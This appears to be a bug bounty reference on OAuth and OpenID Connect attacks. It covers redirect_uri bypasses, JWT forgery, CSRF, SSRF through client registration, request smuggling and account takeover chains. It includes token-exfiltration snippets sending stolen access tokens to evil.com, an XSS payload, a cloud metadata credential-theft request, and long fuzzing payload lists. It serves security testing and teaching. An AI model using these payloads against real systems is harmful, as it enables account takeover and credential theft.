# OAuth & OpenID Connect Bug Bounty Hunting Knowledgebase

> **Research-grade reference for advanced bug bounty hunting, black-box testing, and security assessments**
> 
> Synthesized from: PortSwigger Web Security Academy, PortSwigger Research, PayloadsAllTheThings, HackTricks, Koen Buyens' OAuth 2.0 Security Cheat Sheet, ProjectDiscovery Nuclei Templates, and real-world bug bounty writeups.

---

## Table of Contents

- [Basics](#basics)
- [OAuth Theory](#oauth-theory)
- [OAuth Flows Overview](#oauth-flows-overview)
- [Authorization Code Flow Attacks](#authorization-code-flow-attacks)
- [Implicit Flow Attacks](#implicit-flow-attacks)
- [PKCE Weaknesses](#pkce-weaknesses)
- [OpenID Connect Misconfigurations](#openid-connect-misconfigurations)
- [redirect_uri Bypasses](#redirect_uri-bypasses)
- [state Parameter Weaknesses](#state-parameter-weaknesses)
- [Access Token Theft](#access-token-theft)
- [ID Token Abuse](#id-token-abuse)
- [OAuth Account Takeover Chains](#oauth-account-takeover-chains)
- [postMessage + OAuth Chains](#postmessage--oauth-chains)
- [Open Redirect + OAuth Chains](#open-redirect--oauth-chains)
- [Cache Poisoning + OAuth Chains](#cache-poisoning--oauth-chains)
- [Request Smuggling + OAuth Chains](#request-smuggling--oauth-chains)
- [SSRF + OAuth Chains](#ssrf--oauth-chains)
- [Browser Quirks](#browser-quirks)
- [Gadget Chains](#gadget-chains)
- [Parser Confusion Payloads](#parser-confusion-payloads)
- [Real World Case Studies](#real-world-case-studies)
- [Fuzzing Payloads](#fuzzing-payloads)
- [Automation Workflows](#automation-workflows)
- [Recon Methodology](#recon-methodology)
- [Nuclei Templates](#nuclei-templates)
- [Tools and Scanners](#tools-and-scanners)
- [Advanced Research](#advanced-research)
- [Bug Bounty Writeups](#bug-bounty-writeups)
- [Payload Collections](#payload-collections)
- [WAF Bypasses](#waf-bypasses)
- [Detection Techniques](#detection-techniques)
- [References](#references)

---

## Basics

### What is OAuth 2.0?

OAuth 2.0 is an authorization framework enabling websites and applications to request limited access to user accounts on other services without exposing credentials. It has evolved into a de facto authentication mechanism ("Login with X").

### Key Parties

| Party | Description |
|-------|-------------|
| **Client Application** | The website/app wanting access to user data |
| **Resource Owner** | The user whose data is being accessed |
| **OAuth Service Provider** | Controls user data; provides authorization server + resource server APIs |

### Identifying OAuth in the Wild

Look for these indicators in HTTP traffic:
- Login options like "Log in with Google/Facebook/GitHub"
- Authorization requests to `/authorization` endpoints with parameters:
  - `client_id`
  - `redirect_uri`
  - `response_type`
  - `scope`
  - `state`

```http
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

### Standard Discovery Endpoints

Always probe these endpoints for configuration leakage:

```
GET /.well-known/oauth-authorization-server
GET /.well-known/openid-configuration
```

These return JSON with endpoint locations, supported features, scopes, and grant types — expanding your attack surface significantly.

---

## OAuth Theory

### Why OAuth is Vulnerable

1. **Specification vagueness**: OAuth 2.0 is intentionally flexible. Most components are optional, including critical security settings.
2. **No built-in security features**: Security relies entirely on developers implementing correct configurations and additional validation.
3. **Sensitive data via browser**: Tokens and codes travel through the browser in multiple flows, creating interception opportunities.
4. **Implicit trust in identity data**: Client applications often trust user data from OAuth providers without independent verification.

### Authentication vs Authorization

OAuth 2.0 was designed for **authorization** (access delegation), not **authentication** (identity verification). When used for authentication (SSO-like flows), additional OpenID Connect layer is needed. Using raw OAuth for authentication introduces logical vulnerabilities.

---

## OAuth Flows Overview

### 1. Authorization Code Flow

```
[User] -> [Client App] -> [Authorization Server] -> (login + consent) -> [Client App] -> (POST code + secret) -> [Token Endpoint] -> [Resource Server]
```

**Most secure flow** when combined with PKCE. Code is exchanged server-to-server with client_secret.

### 2. Implicit Flow (DEPRECATED)

```
[User] -> [Client App] -> [Authorization Server] -> (login + consent) -> [Client App#access_token=...]
```

Access token returned directly in URL fragment. **Inherently insecure** — token exposed to browser, JavaScript, browser history, and Referer headers.

### 3. Resource Owner Password Credentials Grant

```
[User] -> (username + password) -> [Client App] -> [Token Endpoint] -> [Resource Server]
```

Client directly handles user credentials. Only acceptable for first-party trusted applications.

### 4. Client Credentials Grant

```
[Client App] -> (client_id + client_secret) -> [Token Endpoint] -> [Resource Server]
```

For machine-to-machine/B2B scenarios. No user involvement.

### 5. Device Authorization Grant

For input-constrained devices. User authorizes via secondary device. Check for polling interval manipulation.

---

## Authorization Code Flow Attacks

### Authorization Code Theft

**Attack**: Steal victim's authorization code before it's used, then exchange it at the legitimate callback endpoint.

**Requirements**:
- `redirect_uri` validation bypass OR open redirect on whitelisted domain
- Code not bound to specific `redirect_uri` during exchange
- Code not invalidated after first use

**Exploitation Chain**:
```
1. Attacker initiates OAuth flow with malicious redirect_uri
2. Victim logs in and authorizes
3. Authorization server redirects to attacker-controlled URI with code
4. Attacker captures code
5. Attacker sends code to legitimate /callback endpoint
6. Client application exchanges code for tokens (server-to-server, attacker can't intercept)
7. Attacker is logged in as victim
```

**Critical Note**: Using `state` or `nonce` does NOT prevent this attack because the attacker generates fresh values from their own browser.

### Authorization Code Injection

**Attack**: Inject a stolen authorization code into the attacker's own session with the client.

**Prevention**:
- PKCE (`code_challenge` + `code_verifier`)
- OpenID Connect `nonce` parameter

### Authorization Code Reuse

**Vulnerability**: Server allows same code to be exchanged multiple times.

**RFC Requirement**: "The client MUST NOT use the authorization code more than once. If an authorization code is used more than once, the authorization server MUST deny the request and SHOULD revoke all tokens previously issued based on that authorization code."

**Test**:
```http
POST /token HTTP/1.1
Host: oauth-authorization-server.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=SAME_CODE&client_id=xxx&client_secret=yyy&redirect_uri=https://client.com/callback
```

Send twice. If second succeeds -> vulnerability.

### Scope Upgrade (Authorization Code Flow)

**Attack**: Register malicious client, obtain code with limited scope, then add broader scope during code->token exchange.

```http
POST /token HTTP/1.1
Host: oauth-authorization-server.com

client_id=ATTACKER_CLIENT&client_secret=SECRET&redirect_uri=https://attacker.com/callback&grant_type=authorization_code&code=STOLEN_CODE&scope=openid%20email%20profile%20admin
```

Server must validate scope against initial authorization request.

### Missing redirect_uri Validation at Token Endpoint

**Vulnerability**: Authorization server doesn't require `redirect_uri` during code exchange.

**Secure behavior**: Server should require `redirect_uri` in token exchange and validate it matches the initial authorization request.

---

## Implicit Flow Attacks

### Authentication Bypass via Implicit Flow

**Vulnerability**: Client application receives access token in fragment, then POSTs user data to `/authenticate` endpoint. Server implicitly trusts this data without verifying token matches user.

**Exploitation**:
```http
POST /authenticate HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com&username=victim&token=ATTACKER_VALID_TOKEN
```

Simply change the `email` parameter to target victim. Server logs you in as that user because it doesn't verify the access token actually belongs to `victim@example.com`.

**Real-world impact**: Mass account takeover — access hundreds of accounts including admins.

### Token Leakage via Browser History

Access tokens in URL fragments are stored in:
- Browser history
- Browser cache
- Server logs (if fragments are incorrectly logged via Referer)
- Shared computer sessions

### Token Leakage via Referer Header

When OAuth callback page loads resources (images, scripts, iframes), the full URL including fragment may be sent in `Referer` header to third-party domains.

**Test**: Load external resource from callback page, intercept Referer.

### Forced OAuth Profile Linking (CSRF via Missing State)

**Scenario**: Site allows linking social media account to existing local account.

**Attack**:
```
1. Attacker logs in with their own social media account
2. Attacker intercepts the callback URL: https://victim.com/callback?code=ATTACKER_CODE
3. Attacker tricks victim (who is logged into victim.com) into visiting this URL
4. Victim's account gets linked to attacker's social media profile
5. Attacker can now log in as victim via "Log in with Social Media"
```

**Root cause**: Missing or improperly validated `state` parameter.

---

## PKCE Weaknesses

### PKCE Downgrade Attack

**Attack Flow**:
```
1. Legitimate client sends authorization request with code_challenge=S256
2. MITM attacker intercepts and strips code_challenge + code_challenge_method
3. Authorization Server sees no PKCE params, assumes "legacy" client
4. Server issues code without PKCE binding
5. Attacker intercepts code via custom URI scheme/browser history
6. Attacker exchanges code WITHOUT code_verifier
7. Attacker obtains valid access token
```

**Requirements**:
- Server supports PKCE but doesn't enforce it for all clients
- Server is "backwards compatible" with non-PKCE flows

**Prevention** (OAuth 2.1 mandate):
- Reject ALL authorization requests lacking `code_challenge`
- Never allow downgrade from S256 to plain

### Plain Method Weakness

```
code_challenge = code_verifier  (no transformation)
```

If attacker observes the initial request, they have the `code_challenge` which equals the `code_verifier`. They can intercept the code and exchange it.

**Always use S256 (SHA-256)**.

### PKCE Parameter Pollution

Try submitting duplicate PKCE parameters with different values:
```
?code_challenge=VALID&code_challenge=INVALID&code_challenge_method=S256&code_challenge_method=plain
```

Some parsers process first occurrence, others last — leading to validation bypass.

---

## OpenID Connect Misconfigurations

### ID Token Signature Bypass (alg=none)

**Attack**: Modify JWT header to use `"alg": "none"`, remove signature, server accepts unsigned token.

```
Header: {"alg": "none", "typ": "JWT"}
Payload: {"sub": "victim", "iss": "https://evil.com", "aud": "client_id", "exp": 9999999999}
Signature: (empty)
```

**Token**:
```
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAidmljdGltIiwgImlzcyI6ICJodHRwczovL2V2aWwuY29tIiwgImF1ZCI6ICJjbGllbnRfaWQiLCAiZXhwIjogOTk5OTk5OTk5OX0.
```

**Variations**:
- `alg: None`, `alg: NONE`, `alg: nOnE` (case sensitivity issues)
- `alg: ernw`, `alg: invalid` — some libraries skip verification for "unknown" algorithms

### Key Confusion (Algorithm Substitution)

**Variant 1 — Attacker-supplied JWK**:
```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/keys.jwks",
  "kid": "attacker-key"
}
```

**Variant 2 — HMAC with RSA public key**:
```json
{
  "alg": "HS256",
  "kid": "legitimate-rsa-key-id"
}
```
Sign with HMAC using the OP's public key as secret.

### ID Token Replay

**Attack**: Reuse stolen/leaked ID token across different clients or sessions.

**Prevention**: Validate `aud` (audience = client_id), `iss` (issuer), `exp` (expiration), and `nonce` (if used).

### Missing nonce Validation

In Implicit and Hybrid flows, `nonce` is REQUIRED. If missing or not validated:
- ID tokens can be replayed
- Tokens from malicious OPs can be injected

### UserInfo Endpoint Spoofing

**Attack**: Malicious OP returns honest user's identifiers in UserInfo response. If RP overwrites ID Token data with UserInfo data, attacker impersonates victim.

**Prevention**: Always match `iss` + `sub` from ID Token with UserInfo response.

### OpenID Connect Discovery Manipulation

If attacker can poison `.well-known/openid-configuration`:
- Redirect to malicious authorization endpoint
- Supply attacker-controlled JWKS URI
- Modify supported scopes/grants

---

## redirect_uri Bypasses

### Validation Bypass Techniques

#### 1. Exact String Matching Bypass

When servers use naive string matching:
```
Whitelisted: https://client-app.com/callback
Bypass:      https://client-app.com/callback/../evil
Bypass:      https://client-app.com/callback/.%00/evil
```

#### 2. Prefix/Starts-With Bypass

```
Whitelisted: https://client-app.com/
Bypass:      https://client-app.com.evil.com/callback
Bypass:      https://client-app.com@evil.com/callback
Bypass:      https://client-app.com%00.evil.com/callback
Bypass:      https://client-app.com\evil.com/callback
Bypass:      https://client-app.com?.evil.com/callback
```

#### 3. Domain Wildcard Abuse

```
Whitelisted: *.client-app.com
Bypass:      https://evil.client-app.com/callback
```

Register `evil.client-app.com` or find subdomain takeover.

#### 4. Path Traversal on Callback

```
Whitelisted: https://client-app.com/oauth/callback
Bypass:      https://client-app.com/oauth/callback/../../profile
Bypass:      https://client-app.com/oauth/callback/%2e%2e%2fprofile
```

#### 5. Query Parameter Injection

```
Whitelisted: https://client-app.com/callback
Bypass:      https://client-app.com/callback?@evil.com
Bypass:      https://client-app.com/callback#@evil.com
Bypass:      https://client-app.com/callback?next=https://evil.com
```

#### 6. Fragment-based Bypass

```
https://client-app.com/callback#https://evil.com
```

Some parsers split on `#` differently during validation vs redirect.

#### 7. Double Encoding / Parser Confusion

```
Original:    https://client-app.com/callback
Payload:     https://client-app.com/callback%2523@evil.com

Decode 1:    https://client-app.com/callback%23@evil.com  (passes validation)
Decode 2:    https://client-app.com/callback#@evil.com    (redirects to evil.com)
```

**Research finding**: Double-encoded `%2523` (#) survives first decode as `%23`, passes validation, then gets decoded again to `#` during redirect, completely changing URL structure.

#### 8. Unicode/IDN Homograph Bypass

```
Whitelisted: https://client-app.com
Bypass:      https://client-аpp.com  (Cyrillic 'а' instead of Latin 'a')
```

#### 9. Scheme Replacement / Deep Link Hijacking

Mobile apps using custom URI schemes:
```
Whitelisted: myapp://oauth/callback
Bypass:      myapp://attacker.com
```

If app routes by host and falls back to WebView:
```
myapp://attacker.com -> WebView loads https://attacker.com?code=xxx
```

#### 10. Parameter Pollution (Duplicate redirect_uri)

```
GET /authorize?client_id=xxx&redirect_uri=https://legitimate.com/callback&redirect_uri=https://evil.com
```

Some frameworks parse first occurrence, others last.

#### 11. Response Mode Switching

Changing `response_mode` can alter `redirect_uri` parsing:
```
?response_mode=fragment&redirect_uri=https://evil.com
?response_mode=web_message&redirect_uri=https://evil.com
```

`web_message` response mode often allows wider subdomain ranges.

#### 12. localhost Bypass

```
Whitelisted: http://localhost:8080/callback
Bypass:      http://localhost.evil.com/callback
```

#### 13. Data URI Scheme

```
redirect_uri=data:text/html,<script>alert(document.location.hash)</script>
```

#### 14. JavaScript URI Scheme

```
redirect_uri=javascript:alert(document.location.hash)
```

### redirect_uri Session Poisoning

**Novel Attack** (PortSwigger Research):

When OAuth servers store `redirect_uri` in session during multi-step flows:

```
Step 1: Attacker sends authorization request with trusted client_id + malicious redirect_uri
        -> Server stores malicious redirect_uri in session

Step 2: Victim visits legitimate authorization request with trusted client_id
        -> Server uses POISONED redirect_uri from session

Step 3: Victim authorizes -> redirected to attacker's domain with code/token
```

**Exploit**:
```html
<!-- Attacker page -->
<script>
// Open trusted OAuth flow in new tab
window.open('https://oauth-server.com/authorize?client_id=TRUSTED&redirect_uri=https://evil.com&response_type=code');

// Immediately send hidden request to poison session
fetch('https://oauth-server.com/authorize?client_id=TRUSTED&redirect_uri=https://evil.com&response_type=code', {mode: 'no-cors'});
</script>
```

**Mitigation**: Use `prompt=consent` to force confirmation, or use interaction_id instead of session storage.

---

## state Parameter Weaknesses

### Missing state Parameter

**Impact**: Full CSRF on OAuth flow — attacker can force victim to complete OAuth flow with attacker's identity.

**Scenarios**:
1. **Account linking CSRF**: Victim's account linked to attacker's social profile
2. **Login CSRF**: Victim logged in as attacker, uploads data to attacker's account
3. **Authorization CSRF**: Victim grants attacker app access to their resources

### Predictable/Static state Values

```
state=12345
state=abcdefg
state=current_timestamp
state=user_id
state=incrementing_counter
```

### Weak Comparison

```javascript
// VULNERABLE - type coercion
if (receivedState == storedState) { ... }

// PHP vulnerable example
if ($_GET['state'] == $_SESSION['state']) { ... }
```

### Missing Invalidation After Use

State should be single-use. Reusable states enable replay attacks.

### state Parameter Injection

```
?state=legitimate&state=attacker_controlled
```

---

## Access Token Theft

### Theft via Open Redirect

```
1. Find open redirect on whitelisted domain: https://victim.com/redirect?url=https://evil.com
2. Set redirect_uri to open redirect: https://victim.com/redirect?url=https://evil.com
3. Victim authorizes -> redirected to evil.com with code/token in query/fragment
```

### Theft via HTML Injection + Referer

When JavaScript injection is blocked but HTML injection works:
```html
<img src="https://evil.com">
```

Firefox sends full URL (including query string with code) in Referer header.

### Theft via postMessage

If callback page uses `postMessage` to communicate token to parent/opener without origin validation:
```javascript
// Vulnerable callback page
window.parent.postMessage({
    access_token: location.hash.split('#')[1],
    status: 'success'
}, "*");  // No origin check!
```

Attacker embeds callback in iframe and listens:
```javascript
window.addEventListener('message', function(e) {
    if (e.data.access_token) {
        fetch('https://evil.com/steal?token=' + e.data.access_token);
    }
});
```

### Theft via XSS on Callback Page

If callback endpoint has XSS:
```
redirect_uri=https://victim.com/callback?<script>fetch('https://evil.com/?t='+location.hash)</script>
```

Stealing OAuth token makes XSS significantly more severe — attacker gains persistent account access.

### Theft via Browser History

```javascript
// Check browser history for tokens
for (let i = 0; i < history.length; i++) {
    // history entries may contain fragments with access_token
}
```

### Theft via Malicious Browser Extension

Extension with `webRequest` API can intercept OAuth callbacks and extract tokens from URLs.

---

## ID Token Abuse

### ID Token as Authentication Proof

**Vulnerability**: Client uses ID token claims (email, sub) to authenticate without validating:
- Signature
- `iss` claim
- `aud` claim  
- `exp` claim
- `nonce` (if applicable)

### ID Token Substitution

Attacker obtains ID token for their own account, modifies claims:
```json
{
  "sub": "victim-subject-id",
  "email": "victim@example.com",
  "iss": "legitimate-op.com",
  "aud": "victim-client-id",
  "exp": 9999999999
}
```

If signature not validated -> instant authentication bypass.

### ID Token Replay Across Clients

ID token obtained from Client A used to authenticate to Client B:
- Must validate `aud` claim matches current client_id
- Must validate `azp` (authorized party) claim

---

## OAuth Account Takeover Chains

### Chain 1: OAuth + Unverified Email Registration

```
1. Attacker registers on OAuth provider with victim's email (unverified)
2. Attacker initiates OAuth login to victim.com
3. victim.com trusts email from OAuth provider
4. Attacker logged in as victim
```

**Real-world**: Some OAuth providers allow registration without email verification.

### Chain 2: OAuth + Password Reset

```
1. Attacker initiates "forgot password" for victim@example.com
2. victim.com sends reset link
3. Attacker cannot access victim's email
4. BUT: Attacker logs in via OAuth with their own account, changes email to victim's
5. Attacker requests password reset -> link sent to victim's email (now attacker-controlled on victim.com)
6. Attacker resets password, takes over account
```

### Chain 3: OAuth + CSRF Profile Linking

```
1. victim.com allows linking OAuth to existing account
2. Attacker completes OAuth flow with their social account
3. Attacker intercepts callback URL with their code
4. Attacker sends callback URL to victim (who is logged into victim.com)
5. victim.com links victim's account to attacker's social profile
6. Attacker logs in as victim via "Log in with Social"
```

### Chain 4: OAuth + Implicit Flow + Email Parameter Tampering

```
1. Attacker logs in via OAuth implicit flow
2. Captures POST /authenticate request
3. Changes email parameter to victim's email
4. Server creates session for victim without verifying token ownership
5. Account takeover
```

### Chain 5: OAuth + Scope Upgrade + Data Theft

```
1. Attacker registers malicious client with minimal scope
2. Victim authorizes minimal scope
3. Attacker adds broader scope during code->token exchange
4. Server issues token with elevated permissions
5. Attacker accesses victim's private data
```

### Chain 6: OAuth + Dynamic Registration + SSRF + Cloud Metadata

```
1. Attacker discovers unprotected /reg endpoint
2. Registers client with logo_uri pointing to cloud metadata service
3. Triggers logo fetch -> server makes SSRF to 169.254.169.254
4. Retrieves AWS/GCP/Azure credentials
5. Full cloud compromise
```

---

## postMessage + OAuth Chains

### Token Exfiltration via postMessage

**Scenario**: OAuth callback page sends token to parent window via postMessage.

**Vulnerable Pattern**:
```javascript
// callback.html
window.opener.postMessage({
    access_token: location.hash.split('#')[1],
    status: 'success'
}, "*");  // No origin check!
```

**Exploit**:
```html
<!-- attacker.html -->
<script>
window.open('https://victim.com/oauth/callback#access_token=STOLEN', 'oauth');

window.addEventListener('message', function(e) {
    if (e.data.access_token) {
        fetch('https://evil.com/steal?token=' + e.data.access_token);
    }
});
</script>
```

### postMessage Origin Spoofing

If callback checks origin but allows wildcards:
```javascript
// Vulnerable: allows any subdomain
if (e.origin.endsWith('.victim.com')) { ... }

// Bypass: attacker controls evil.victim.com
```

### postMessage + DOM Clobbering

If callback page uses DOM elements to determine target origin:
```html
<!-- Attacker controls HTML before callback script runs -->
<a id="config" data-origin="https://evil.com"></a>
```

Script reads `document.getElementById('config').dataset.origin` -> sends token to attacker.

---

## Open Redirect + OAuth Chains

### Finding Open Redirects for OAuth Proxy

Look for these patterns on whitelisted domains:
```
/redirect?url=https://evil.com
/redirect?to=https://evil.com
/redirect?next=https://evil.com
/redirect?return=https://evil.com
/out?link=https://evil.com
/goto?url=https://evil.com
```

### Bypassing redirect_uri via Open Redirect

```
redirect_uri=https://victim.com/redirect?url=https://evil.com
```

Authorization server validates `https://victim.com/redirect?url=https://evil.com` against whitelist (passes — starts with whitelisted domain). User redirected to victim.com/redirect, which then redirects to evil.com with code/token appended.

### Double Open Redirect

```
redirect_uri=https://victim.com/redirect?url=https://intermediate.com/redirect?url=https://evil.com
```

### Open Redirect in OAuth Provider Itself

Some OAuth providers have open redirects in their own domain:
```
https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
```

---

## Cache Poisoning + OAuth Chains

### Cache Poisoning via OAuth Callback

**Scenario**: OAuth callback page is cacheable and includes user-specific content.

**Attack**:
```
1. Attacker requests: GET /callback?code=ATTACKER_CODE&state=xyz
2. Response contains attacker's session data
3. Response is cached by CDN/proxy
4. Victim requests same URL -> gets attacker's cached response
5. Victim's browser sets attacker's session cookies
```

**Indicators**:
- Callback page sets cookies
- Callback page has `Cache-Control: public` or missing cache headers
- CDN in front of OAuth flow

### Cache Key Manipulation

```
GET /callback?code=xxx&state=yyy&utm_source=evil
```

If cache key includes all query params but application only processes `code` and `state`, attacker can poison cache with `utm_source` variations.

---

## Request Smuggling + OAuth Chains

### CL.TE Smuggling to Poison OAuth Session

```http
POST /oauth/authorize HTTP/1.1
Host: victim.com
Content-Length: 5
Transfer-Encoding: chunked

1
A
0

GET /oauth/authorize?client_id=xxx&redirect_uri=https://evil.com HTTP/1.1
Host: victim.com
```

Front-end processes Content-Length (5 bytes: `1
A
0
`), back-end processes Transfer-Encoding, sees second request. Second request poisons session with malicious redirect_uri.

### TE.CL Smuggling

```http
POST /oauth/authorize HTTP/1.1
Host: victim.com
Content-Length: 6
Transfer-Encoding: chunked
Transfer-Encoding: x

0

GET /callback?code=STOLEN HTTP/1.1
Host: evil.com
```

### HTTP/2 Downgrade Smuggling

HTTP/2 -> HTTP/1.1 conversion can introduce request smuggling opportunities in OAuth endpoints.

**Target endpoints**:
- `/oauth/authorize`
- `/oauth/token`
- `/oauth/confirm_access`
- `/.well-known/openid-configuration`

---

## SSRF + OAuth Chains

### SSRF via Dynamic Client Registration

**Parameters accepting URLs** (second-order SSRF):

| Parameter | Trigger Mechanism | SSRF Type |
|-----------|-------------------|-----------|
| `logo_uri` | Logo fetch during authorization/consent page | Semi-blind |
| `jwks_uri` | JWKS fetch during token exchange with JWT client assertion | Blind |
| `sector_identifier_uri` | Fetch during authorization for redirect_uri validation | Semi-blind |
| `request_uris` | Fetch during authorization when `request_uri` param used | Blind |
| `client_uri` | Client info display | Client-side |
| `policy_uri` | Policy link display | Client-side |
| `tos_uri` | TOS link display | Client-side |

**Exploit — logo_uri**:
```http
POST /reg HTTP/1.1
Host: oauth-server.com
Content-Type: application/json

{
    "redirect_uris": ["https://example.com"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

Then visit `/client/{client_id}/logo` to trigger fetch.

**Exploit — jwks_uri**:
```http
POST /reg HTTP/1.1
Host: oauth-server.com
Content-Type: application/json

{
    "redirect_uris": ["https://example.com"],
    "jwks_uri": "http://169.254.169.254/latest/meta-data/"
}
```

Then perform authorization + token exchange with JWT client assertion to trigger JWKS fetch.

**Exploit — request_uri** (even without dynamic registration):
```http
GET /authorize?response_type=code%20id_token&client_id=xxx&request_uri=https://evil.com/request.jwt HTTP/1.1
Host: oauth-server.com
```

Server fetches JWT from attacker-controlled URL.

### SSRF via request_uri (Keycloak CVE-2020-10770)

```
https://keycloak.local/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=VALID&state=aaa&nonce=bbb&client_id=VALID&request_uri=http://127.0.0.1:1234
```

Blind SSRF — measure response times for port scanning.

### Cloud Metadata Extraction Chain

```
1. Discover OAuth server running on cloud (AWS/GCP/Azure)
2. Find dynamic registration endpoint via /.well-known/openid-configuration
3. Register client with logo_uri = http://169.254.169.254/latest/meta-data/
4. Trigger logo fetch -> receive IAM credentials
5. Use credentials for cloud lateral movement
```

---

## Browser Quirks

### Fragment Handling Differences

| Browser | Fragment Behavior |
|---------|-------------------|
| Chrome | Fragment stripped from Referer on cross-origin requests (mostly) |
| Firefox | Fragment MAY be included in Referer in some cases |
| Safari | Generally strips fragments |
| Edge | Same as Chrome |

**Key insight**: Firefox may send full URL including fragment in Referer when navigating from HTTPS to HTTP.

### URL Encoding Decoding Differences

**Double encoding exploitation**:
```
%2523 -> %23 -> #
%252F -> %2F -> /
%2540 -> %40 -> @
```

Different components decode at different stages:
- Browser address bar: decodes for display
- JavaScript `location.href`: returns encoded form
- Server validation: may decode once
- Server redirect: may decode again

### postMessage Origin Behavior

```javascript
// Chrome: exact match required for file:// origins
// Firefox: allows broader matching
// Safari: strict about port matching
```

### localStorage/sessionStorage Persistence

OAuth tokens stored in `localStorage` persist across:
- Browser restarts
- Incognito mode (until last incognito window closes)
- Different tabs

Tokens in `sessionStorage` persist only for tab lifetime.

### Cookie Behavior with SameSite

```
SameSite=None: Token cookies sent on all requests (including cross-site)
SameSite=Lax: Token cookies NOT sent on POST from cross-site (protects CSRF)
SameSite=Strict: Token cookies only sent on same-site navigation
```

If OAuth callback sets `SameSite=None` cookie without `Secure` -> potential MITM.

---

## Gadget Chains

### OAuth + DOM Clobbering

If OAuth callback page uses DOM elements for configuration:
```html
<!-- Before script runs, attacker injects: -->
<form name="oauthConfig">
  <input name="redirectEndpoint" value="https://evil.com/steal">
</form>
```

Script does:
```javascript
const endpoint = document.oauthConfig.redirectEndpoint.value;
fetch(endpoint + '?token=' + token);
```

### OAuth + Prototype Pollution

If OAuth library merges user data with defaults:
```javascript
// Vulnerable merge
Object.assign(defaultConfig, userConfig);

// Attacker sends:
userConfig = JSON.parse('{"__proto__": {"admin": true}}');
```

### OAuth + JSONP

If OAuth provider supports JSONP callback:
```
/oauth/token?callback=attackerFunction&code=xxx
```

Response:
```javascript
attackerFunction({"access_token": "secret", ...});
```

Attacker can embed via `<script>` tag and capture token.

### OAuth + CORS Misconfiguration

If OAuth endpoints have permissive CORS:
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Attacker can make authenticated requests from evil.com:
```javascript
fetch('https://oauth-server.com/userinfo', {
    credentials: 'include'
});
```

---

## Parser Confusion Payloads

### URL Parser Confusion Collection

```
https://trusted.com@evil.com
https://trusted.com%00.evil.com
https://trusted.com?.evil.com
https://trusted.com#.evil.com
https://trusted.com\evil.com
https://trusted.com/@evil.com
https://trusted.com:80@evil.com
https://trusted.com%2f%2f.evil.com
https://trusted.com%5c%5c.evil.com
https://trusted.com%2523.evil.com
https://trusted.com%252f.evil.com
https://trusted.com%255c.evil.com
https://trusted.com%252f%252f.evil.com
https://trusted.com%255c%255c.evil.com
https://trusted.com%2523%2540.evil.com
https://trusted.com%2523%252f.evil.com
https://trusted.com%3f.evil.com
https://trusted.com%23.evil.com
https://trusted.com%40.evil.com
https://trusted.com%09.evil.com
https://trusted.com%0d.evil.com
https://trusted.com%0a.evil.com
https://trusted.com%0d%0a.evil.com
https://trusted.com%20.evil.com
```

### Unicode Normalization Bypasses

```
https://trusted.com/＃evil.com  (fullwidth hash)
https://trusted.com/＠evil.com  (fullwidth at)
```

### Scheme Confusion

```
javascript://trusted.com/%0aalert(1)
data://trusted.com,text/html,<script>alert(1)</script>
about://trusted.com
view-source://trusted.com
```

### IPv6/IPv4 Embedding

```
http://0x7f000001/  (127.0.0.1)
http://0177.0.0.1/   (octal)
http://2130706433/   (decimal)
http://[::ffff:127.0.0.1]/
```

---

## Real World Case Studies

### Case Study 1: PayPal OAuth Token Theft (asanso, 2016)

**Vulnerability**: `redirect_uri` validation bypass on PayPal OAuth
**Impact**: Full account takeover for any PayPal user
**Technique**: Subdomain manipulation + path traversal on redirect_uri

### Case Study 2: Facebook OAuth Code Interception (asanso, 2014)

**Vulnerability**: Authorization code leakage via `redirect_uri` manipulation
**Impact**: Access token theft for Facebook users
**Technique**: Exploited Facebook's OAuth implementation to steal valid access tokens

### Case Study 3: GitHub OAuth Account Hijacking (Egor Homakov, 2014)

**Vulnerability**: Forced OAuth profile linking via missing state parameter
**Impact**: Admin panel access on GitHub
**Technique**: CSRF to link attacker's GitHub account to victim's GitHub account

### Case Study 4: Microsoft OAuth Data Leakage (Andris Atteka, 2014)

**Vulnerability**: OAuth scope validation flaw
**Impact**: User data exposed to unauthorized applications
**Technique**: Scope upgrade during token exchange

### Case Study 5: Periscope Admin Panel Bypass (Jack Whitton, 2015)

**Vulnerability**: Google OAuth authentication bypass
**Impact**: Admin panel access
**Technique**: Manipulated OAuth flow to bypass authentication checks

### Case Study 6: MITREid Connect SSRF (CVE-2021-26715)

**Vulnerability**: SSRF via `logo_uri` in dynamic client registration
**Impact**: Server-side request forgery + XSS
**Technique**: Registered malicious client with arbitrary `logo_uri`, triggered server-side fetch

### Case Study 7: MITREid Connect Session Poisoning (CVE-2021-27582)

**Vulnerability**: `redirect_uri` session poisoning via Spring mass assignment
**Impact**: Authorization code/token theft
**Technique**: Two-link attack — `/authorize` with trusted client + `/confirm_access` with malicious redirectUri parameter

### Case Study 8: Keycloak Blind SSRF (CVE-2020-10770)

**Vulnerability**: SSRF via `request_uri` parameter
**Impact**: Internal port scanning + metadata access
**Technique**: `request_uri` pointing to internal addresses in authorization request

### Case Study 9: OAuth + Forgot Password Chain (Bugcrowd, 2024)

**Vulnerability**: OAuth registration + password reset code manipulation
**Impact**: Non-brute force account takeover
**Technique**: Linked OAuth account, changed email, triggered password reset to attacker-controlled email

---

## Fuzzing Payloads

### redirect_uri Fuzzing List

```
https://evil.com
https://evil.com/callback
https://localhost.evil.com
https://127.0.0.1.evil.com
https://[::ffff:127.0.0.1].evil.com
https://0x7f000001
https://0177.0.0.1
https://2130706433
https://trusted.com@evil.com
https://trusted.com%00.evil.com
https://trusted.com%0d%0a.evil.com
https://trusted.com%0a.evil.com
https://trusted.com?.evil.com
https://trusted.com#.evil.com
https://trusted.com\evil.com
https://trusted.com/.evil.com
https://trusted.com\\evil.com
https://trusted.com%2f%2f.evil.com
https://trusted.com%5c%5c.evil.com
https://trusted.com%2523.evil.com
https://trusted.com%252f.evil.com
https://trusted.com%255c.evil.com
https://trusted.com%252f%252f.evil.com
